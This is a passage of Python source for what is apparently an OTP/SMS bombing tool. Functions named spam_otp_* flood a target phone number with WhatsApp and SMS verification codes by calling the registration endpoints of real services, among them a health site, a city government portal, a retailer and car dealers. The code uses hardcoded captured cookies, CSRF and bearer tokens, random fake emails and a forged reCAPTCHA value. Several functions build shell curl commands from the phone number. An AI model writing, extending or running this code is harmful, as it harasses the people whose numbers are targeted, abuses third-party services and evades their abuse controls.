            'deviceId': 'Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F149.0.0.0%20Mobile%20Safari%2F537.36',
            '_gcl_gs': '2.1.k1$i1783212550$u132089247',
            '_gcl_aw': 'GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB',
            '_ga_HSTJBSDEEW': 'GS2.1.s1783212562$o1$g0$t1783212562$j60$l0$h0',
            '_ga': 'GA1.1.2146116177.1783212563',
            '_fbp': 'fb.2.1783212567536.574928455222574690',
            '_uetsid': '5d560b00780b11f1aef395103683bb8f',
            '_uetvid': '5d56eab0780b11f1b98421a5d543c1a8',
            '_gcl_au': '1.1.612971413.1783212562.894107281.1783212583.1783212631'
        }
        
        session.cookies.update(cookies)
        
        names = ['user', 'test', 'demo', 'account', 'customer', 'client', 'member']
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
        email = f"{random.choice(names)}{random.randint(100, 9999)}@{random.choice(domains)}"
        
        headers_base = {
            'Accept': 'text/x-component',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.acc.co.id',
            'Referer': 'https://www.acc.co.id/register/new-account',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }
        
        headers_step1 = headers_base.copy()
        headers_step1['next-action'] = '7fc5be84ee185b80f736b9361a94bb5b7008609886'
        headers_step1['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
        
        payload_step1 = [{"email": email}]
        
        r1 = session.post('https://www.acc.co.id/register/new-account',
            headers=headers_step1,
            json=payload_step1,
            timeout=10
        )
        
        if r1.status_code != 200:
            return False
        
        headers_step2 = headers_base.copy()
        headers_step2['next-action'] = '7fc5be84ee185b80f736b9361a94bb5b7008609886'
        headers_step2['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
        
        payload_step2 = [{"phone": nomor}]
        
        r2 = session.post('https://www.acc.co.id/register/new-account',
            headers=headers_step2,
            json=payload_step2,
            timeout=10
        )
        
        if r2.status_code != 200:
            return False
        
        headers_step3 = headers_base.copy()
        headers_step3['next-action'] = '7fb263ed0e316a392a6bcaa10f6b95ac32c1c1933b'
        headers_step3['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
        
        payload_step3 = [
            {
                "user_id": None,
                "action": "register",
                "send_to": nomor,
                "provider": "whatsapp"
            }
        ]
        
        r3 = session.post('https://www.acc.co.id/register/new-account',
            headers=headers_step3,
            json=payload_step3,
            timeout=10
        )
        
        if r3.status_code == 200:
            try:
                data = r3.json()
                if data and len(data) > 0:
                    result = data[0]
                    if result.get('success'):
                        return True
                    elif result.get('error'):
                        return False
                    else:
                        return True
                else:
                    return True
            except:
                return True if r3.status_code == 200 else False
        else:
            return False
        
    except Exception as e:
        return False

def spam_otp_acc(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if len(nomor) < 10:
            return False
        
        session = requests.Session()
        
        cookies = {
            '_gcl_gs': '2.1.k1$i1783212550$u132089247',
            '_gcl_aw': 'GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB',
            '_ga': 'GA1.1.2146116177.1783212563',
            '_fbp': 'fb.2.1783212567536.574928455222574690',
            'acw_tc': '0a0a01e217835298403947009e4f1c9a16075729b378a863551f2fa9c47ee0',
            'deviceId': 'Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F149.0.0.0%20Mobile%20Safari%2F537.36',
            '_ga_HSTJBSDEEW': 'GS2.1.s1783529854$o2$g0$t1783529854$j60$l0$h0',
            '_uetsid': '1e3f09507aee11f1b6543d17dd2ca805',
            '_uetvid': '5d56eab0780b11f1b98421a5d543c1a8',
            '_gcl_au': '1.1.612971413.1783212562.2026417872.1783529859.1783529963'
        }
        
        session.cookies.update(cookies)
        
        headers_base = {
            'Accept': 'text/x-component',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.acc.co.id',
            'Referer': 'https://www.acc.co.id/register/new-account',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }
        
        headers = headers_base.copy()
        headers['next-action'] = '7fd7799322a505bdfacd0dcd6cac5aa319e2350972'
        headers['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
        
        payload = [
            {
                "user_id": None,
                "action": "register",
                "send_to": nomor,
                "provider": "whatsapp"
            }
        ]
        
        resp = session.post('https://www.acc.co.id/register/new-account',
            headers=headers,
            json=payload,
            timeout=10
        )
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data and len(data) > 0:
                    result = data[0]
                    if result.get('success'):
                        return True
                    else:
                        return False
                else:
                    return True
            except:
                if 'Server action not found' in resp.text:
                    return False
                return True if resp.status_code == 200 else False
        else:
            return False
        
    except Exception as e:
        return False
        
def spam_otp_alodokter_sms(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = nomor
        elif nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = '0' + nomor
        
        raw = nomor_lokal[1:] if nomor_lokal.startswith('0') else nomor_lokal
        
        uuid_val = str(uuid.uuid4())
        
        session = requests.Session()
        url = "https://www.alodokter.com/resend-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.alodokter.com',
            'x-csrf-token': 'Q40kfZBa/+ipTHv2irApJ9WBV3zSw8C55llxXbw+qPmG6LrCzTXxJaxKV1mQpLLXp0XpOkmYZBSjgVV2a+itPg==',
            'Referer': f'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }
        
        payload = {
            "user": {
                "phone": nomor_lokal,
                "uuid": uuid_val
            },
            "request_via": "sms"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_alodokter(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor
        elif nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = "0" + nomor
        
        raw = nomor_lokal[1:] if nomor_lokal.startswith("0") else nomor_lokal
        
        import uuid
        uuid_val = str(uuid.uuid4())
        
        session = requests.Session()
        url = "https://www.alodokter.com/resend-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.alodokter.com',
            'x-csrf-token': 'o/FdMeWMEtf5/jbtImqJr9Wuau4r9I/boJAwEcUQv3x+WGzrnGnjY3WdVSdd9P2FVrx17l4r02I7VLEjCYoPrg==',
            'Referer': f'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "user": {
                "phone": nomor_lokal,
                "uuid": uuid_val
            },
            "request_via": "whatsapp"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_sidemang(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor
        
        import random
        import string
        
        nama = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        email = f"{nama}{random.randint(100, 999)}@gmail.com"
        
        url = 'https://sidemang.palembang.go.id/api/users/register/send-otp'
        
        headers = {
            'Content-Type': 'application/json',
            'origin': 'https://sidemang.palembang.go.id',
            'referer': 'https://sidemang.palembang.go.id/register-otp',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        payload = {
            "phoneNumber": nomor,
            "email": email
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False
        
def spam_watsons_otp(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
              
        curl = f'''curl -s -X POST 'https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: bearer N0c9BjcFxsJ53qUngEn3jwsOJLs' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Accept-Encoding: gzip, deflate, br' \
  -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'Origin: https://www.watsons.co.id' \
  -H 'Referer: https://www.watsons.co.id/' \
  -d '{{"uid":"","action":"GENERAL","countryCode":"62","target":"{nomor}","type":"WHATSAPP"}}' '''
        
        result = subprocess.run(curl, shell=True, capture_output=True, text=True)
        return result.stdout if result.returncode == 0 else None
        
    except:
        return None

def spam_watsons_otp(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        
        url = 'https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR'
        
        headers = {
            'Content-Type': 'application/json',
            'Authorization': 'bearer N0c9BjcFxsJ53qUngEn3jwsOJLs',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Origin': 'https://www.watsons.co.id',
            'Referer': 'https://www.watsons.co.id/'
        }
        
        payload = {
            "uid": "",
            "action": "GENERAL",
            "countryCode": "62",
            "target": nomor,
            "type": "WHATSAPP"
        }
        
        response = requests.post(url, headers=headers, json=payload)
        return response.json() if response.status_code == 200 else None
            
    except:
        return None

def spam_otp_auto2000(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '0' + nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor
        
        session = requests.Session()
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Origin': 'https://auto2000.co.id',
            'Referer': 'https://auto2000.co.id/login',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Cookie': 'system_token=mMkWFTdV2sGRGfHhS9eVhRs9GW4; __Host-next-auth.csrf-token=74795eb894c6ab07042311954b4aa549a62fdef207f4a7596031b08d2330ed19%7Cda4eccb6846c89e90f0caaf3e485c17376d408f8dca57c6e094de277ec30051e; __Secure-next-auth.callback-url=https%3A%2F%2Fauto2000.co.id'
        }
        
        check_url = 'https://auto2000.co.id/api/customer/v1/saphybris/customers/check-account'
        check_payload = {
            "phoneNumber": nomor,
            "needVerification": True
        }
        
        resp_check = session.post(check_url, json=check_payload, headers=headers, timeout=10)
        
        if resp_check.status_code != 200:
            return False
        
        check_data = resp_check.json()
        if check_data.get('status') == 'error':
            return False
        
        otp_url = 'https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp'
        otp_payload = {
            "phoneNumber": nomor,
            "isCheckOtpLimit": True,
            "uniqueID": nomor,
            "isLogin": False,
            "dacUnicode": ""
        }
        
        resp_otp = session.post(otp_url, json=otp_payload, headers=headers, timeout=10)
        
        if resp_otp.status_code == 200:
            data = resp_otp.json()
            if data.get('message') == 'Success':
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_auto2000(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        url = 'https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp'
        
        headers = {
            'Host': 'auto2000.co.id',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile': '?1',
            'baggage': 'sentry-environment=PRD,sentry-public_key=a9168ed9e0239b8f02f772e5cb953cbf,sentry-trace_id=7d8e539a8fb54552a1cc3aac6fb1404d,sentry-transaction=%2Flogin,sentry-sampled=true,sentry-sample_rand=0.21923493905699087,sentry-sample_rate=1',
            'sentry-trace': '7d8e539a8fb54552a1cc3aac6fb1404d-88ab5675ac537dca-1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://auto2000.co.id',
            'Referer': 'https://auto2000.co.id/login',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cookie': 'UU_PDP_CHECKBOX_CONTENT=PHA+U2F5YSBzZXR1anUgdW50dWsgbWVuZXJpbWEgcHJvZ3JhbSBwcm9tb3NpIGRhbiBsYXlhbmFuIGRhcmkgQXV0bzIwMDAgc2VzdWFpIGRlbmdhbiA8c3BhbiBzdHlsZT0iY29sb3I6cmdiKDAsIDEwMiwgMjA0KSI+PHNwYW4gaWQ9InN5YXJhdC1rZXRlbnR1YW4iIHN0eWxlPSJjb2xvcjpyZ2IoMCwgMTAyLCAyMDQpO2N1cnNvcjpwb2ludGVyIj5TeWFyYXQgZGFuIEtldGVudHVhbjwvc3Bhbj48L3NwYW4+PHNwYW4+IGRhbiA8L3NwYW4+PHNwYW4gaWQ9InBlbWJlcml0YWh1YW4tcHJpdmFzaSIgc3R5bGU9ImNvbG9yOnJnYigwLCAxMDIsIDIwNCk7Y3Vyc29yOnBvaW50ZXIiPlBlbWJlcml0YWh1YW4gUHJpdmFzaTwvc3Bhbj4geWFuZyBiZXJsYWt1LjwvcD4%3D; UU_PDP_POPUP_CONTENT=PHA+PHN0cm9uZz5TYWxhbSBBdXRvRmFtaWx5IEJhcGFrL0lidSB7Y3VzdG9tZXJOYW1lfSE8L3N0cm9uZz48L3A+PHA+PGJyIC8+PC9wPjxwPlRlcmltYSBrYXNpaCB0ZWxhaCBtZW1pbGloIEF1dG8yMDAwLiBLbGlrIOKAnFNldHVqdeKAnSB1bnR1ayBwZW5nYWxhbWFuIG9wdGltYWwgJmFtcDsgcGVyc29uYWxpc2FzaSBsYXlhbmFuIHNlc3VhaSBkZW5nYW4gPHNwYW4gaWQ9InN5YXJhdC1rZXRlbnR1YW4iIHN0eWxlPSJjb2xvcjpyZ2IoMCwgMTAyLCAyMDQpO2N1cnNvcjpwb2ludGVyIj5TeWFyYXQgZGFuIEtldGVudHVhbjwvc3Bhbj4gJmFtcDsgPHNwYW4gaWQ9InBlbWJlcml0YWh1YW4tcHJpdmFzaSIgc3R5bGU9ImNvbG9yOnJnYigwLCAxMDIsIDIwNCk7Y3Vyc29yOnBvaW50ZXIiPlBlbWJlcml0YWh1YW4gUHJpdmFzaTwvc3Bhbj4uPC9wPg%3D%3D; __gcl_au=1.1.1768235826.1784098499; _ga=GA1.1.195703634.1784098502; _fbp=fb.2.1784098503407.212865537130129769; _tt_enable_cookie=1; _ttp=01KXJ8XFB6NA5CZT43HK9H4DC3_.tt.2; cf_clearance=WGR.MGEa4UU0ZxdEVIwLOv5sfHpdgKnUG916yHcVigE-1784474119-1.2.1.1-tsze3pbi8pCNyF_J11EryCZz7P78u_cYluNy.PNJBIxYh9zhM4_pto2BBAd6f65.6CuMSSQPLuRQojy5gGtMYqvp_vfm1IQ9W42VuDhBETtRR9OiJf6B7y4gP0JwKHEXZkFbfNugtKdonoXSQmezhr.gX1a8LpuEUwKb_1ebP_AKmck6z0YnBK6zfxZsaptPT24wViudMt7eTeo8zJcUwRuAsW2kiMR5xj2kL774YNdaS8ZZpfc8BmSOGQt64sCVT9Jy9wT0W9LKcRVqoUH0Xht_8F68VYi5I29VIrK4OSVRTSrT..RNpyZXmxknlYkZHZOTQzLqKgSZQ5_nlUSgFg; __cf_bm=N.yhTYi6ikXVdOVLPWJrfc4gfnJqvkHA4pysnjPjp9k-1784474119.371274-1.0.1.1-GQ.D5nngKtBUGDeO5ueyHgFNNdWXLHdxtsxcUE63Tnpyx4wSdsy2yplAjPoQOly7gwY36P9bonbnnEoUMfvlAJP2DFAhfQspOpEhms6XXUsD1.9ejWiU3nk_RQXiSiGq; scarab.visitor=%22195488A3EF1F1312%22; hardwareId=EMS2D-AF23A_4955e428-f3e9-43db-8d3a-7e0c71350f52; _gcl_au=1.1.1919541313.1784098500.-.-.1784474130.450855288.1784474131.1784474130; mycookies=s7; system_token=uSiiHEFq6k_cwJDq-Kn_sV0csNc; ttcsid=1784474133713::0WWL-1SZUwys7jVXthPb.2.1784474138259.0::1.-20188.213::4440.2.440.578::0.0.0; ttcsid_C6FGON96L5602R4VI2T0=1784474133705::vmd0mCMg8vz-zJIItvYq.2.1784474138260.0; ttcsid_D2I412BC77U9B02M0UGG=1784474133725::W9t_dL9b1tFKGthRORIF.2.1784474138261.0; _ga_RB1QMC9XF8=GS2.1.s1784474131$o2$g0$t1784474138$j53$l0$h1755439970'
        }
        
        payload = {
            "phoneNumber": phone,
            "isCheckOtpLimit": False,
            "uniqueID": phone,
            "isLogin": False
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
        
    except Exception as e:
        return False
        
def spam_otp_carro(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif nomor.startswith('+62'):
            nomor = nomor
        else:
            nomor = '+62' + nomor
        
        import random
        import string
        
        recaptcha = ''.join(random.choices(string.ascii_letters + string.digits + "-_", k=500))
        
        url = 'https://carro.co/_actions/requestOtp/'
        
        headers = {
            'Host': 'carro.co',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'Content-Type': 'application/json',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://carro.co',
            'Referer': 'https://carro.co/id/id',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        payload = {
            "countryCode": "id",
            "locale": "id",
            "mobileNumber": nomor,
            "provider": "whatsapp",
            "recaptchaResponse": recaptcha,
            "recaptchaAction": "id_idid_requestOtp"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_kpoin(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        
        unique_id = "62" + nomor
        
        curl = f'''curl -s -X POST "https://app.kpoin.com/api/bff/v1/notification/sendotp" \\
  -H "Accept: application/json, text/plain, */*" \\
  -H "Content-Type: application/json" \\
  -H "ApplicationChannel: 901101" \\
  -H "ApplicationBrand: 0" \\
  -H "ApplicationStoreID: 0" \\
  -H "DateTimeTick: 639202390378350000" \\
  -d '{{"UniqueID":"{unique_id}","NotifType":"109104","OtpType":"119102","OtpDigit":6}}'
'''
        result = subprocess.run(curl, shell=True, capture_output=True, text=True)
        return result.stdout if result.returncode == 0 else None
        
    except:
        return None
 
def spam_otp_bundasemarang(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        
        unique_id = "62" + nomor
        
        curl = f'''curl -X POST http://pendaftaran.bundasemarang.co.id/pendaftaran-online/reqOTP \\
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \\
  -H "Accept: */*" \\
  -H "X-Requested-With: XMLHttpRequest" \\
  -d "_token=9lVZUAdzSHkBAnTSFlLjQXHmxEXE87kCDfAF8Mt5&nohp={unique_id}"'''
        
        result = subprocess.run(curl, shell=True, capture_output=True, text=True)
        return result.stdout if result.returncode == 0 else None
        
    except:
        return None           

def spam_otp_erp360(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        import random
        import string
        import urllib.parse
        
        name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
        email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
        
        url = 'https://erp360.id/crm/admin/wcf/WebService.asmx/sendVerificationCodeV1'
        
        headers = {
            'Host': 'erp360.id',
            'sec-ch-ua-platform': '"Android"',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/plain, */*; q=0.01',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://erp360.id',
            'Referer': 'https://erp360.id/crm/admin/register',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        payload = {
            "handphone": phone,
            "name": name,
            "email": email
        }
        
        data = urllib.parse.urlencode(payload)
        
        resp = requests.post(url, data=data, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False
 
def spam_otp_amaha(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if nomor.startswith('0'):
            nomor = nomor[1:]
        
        import subprocess
        import json
        
        url = f"https://api.theinnerhour.com/v1/get_otp?country_code=62&mobile_country=Indonesia&mobile={nomor}&login=yes"
        
        curl_cmd = f"""curl -s -X GET '{url}' \\
  -H 'accept: */*' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'origin: https://www.amahahealth.com' \\
  -H 'referer: https://www.amahahealth.com/' \\
  -H 'sec-ch-ua: "Google Chrome";v="150", "Chromium";v="150", "Not)A;Brand";v="24"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-site: cross-site' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'priority: u=1, i' \\
  -H 'platform: mobile' \\
  -H 'x-country: IN' \\
  -H 'x-timezone: Asia/Jakarta'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success' or data.get('otp_sent'):
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False       

def spam_otp_idealz(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://www.idealzlebanon.com/on/demandware.store/Sites-idealz-lb-Site/en/Gupshup-SmsAuthWeb' \\
  -H 'host: www.idealzlebanon.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://www.idealzlebanon.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.idealzlebanon.com/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
